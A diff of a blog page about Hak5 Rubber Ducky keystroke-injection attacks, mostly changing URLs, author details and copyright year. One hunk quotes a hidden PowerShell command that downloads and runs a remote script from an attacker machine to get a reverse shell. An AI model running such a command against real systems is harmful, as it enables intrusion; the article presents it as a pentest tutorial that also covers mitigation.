@@ -18,14 +18,14 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="bynafrez08.io">
 <meta property="og:title" content="Hak5 - Rubber Ducky">
-<meta property="og:url" content="http://localhost:4000/hak5-rubberducky/">
+<meta property="og:url" content="http://0.0.0.0:4000/hak5-rubberducky/">
 
 
   <meta property="og:description" content="Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/img-rubberd/portada1.jpg">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/images/img-rubberd/portada1.jpg">
 
 
 
@@ -42,7 +42,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/hak5-rubberducky/">
+<link rel="canonical" href="http://0.0.0.0:4000/hak5-rubberducky/">
 
 
 
@@ -55,7 +55,7 @@
       "@context": "https://schema.org",
       "@type": "Person",
       "name": "",
-      "url": "http://localhost:4000",
+      "url": "http://0.0.0.0:4000",
       "sameAs": null
     }
   </script>
@@ -160,7 +160,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://0.0.0.0:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -188,18 +188,18 @@
       
 
       
-        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+        <img src="/assets/images/avatar1.png" alt="bynafrez" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+      <h3 class="author__name" itemprop="name">bynafrez</h3>
     
     
       <p class="author__bio" itemprop="description">
-        Networking / Pentesting / Offensive Security
+        Offensive Security / CTF / Networking / IT enthusiast
       </p>
     
   </div>
@@ -445,7 +445,7 @@
 
 <p>This is the second part of the payload we are going to use the following command to receive the shell from the victim machine in our attacker machine, This command is very simple what it does is download and execute the <strong><em>ps1</em></strong> on the victim machine, that this <strong><em>ps1</em></strong> file is gon a be hosted on our attacker machine with python or php. And in this case i use <strong><em>hidden</em></strong> so it doesn’t show that command is running.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">powershell</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.118.131/payload.ps1');
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.118.131/payload.ps1');
 </span></code></pre></div></div>
 
 <p>And now in our attacker’s machine we are going to create a temporal http server with python in one window to host our <strong><em>ps1</em></strong> script so that we can download in the victim machine, and on the other window we are going to be listening to receive the connection with netcat.</p>
@@ -598,7 +598,7 @@
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2022 bynafrez08.io</div>
+<div class="page__footer-copyright">&copy; 2025 bynafrez08.io</div>
 
       </footer>
     </div>
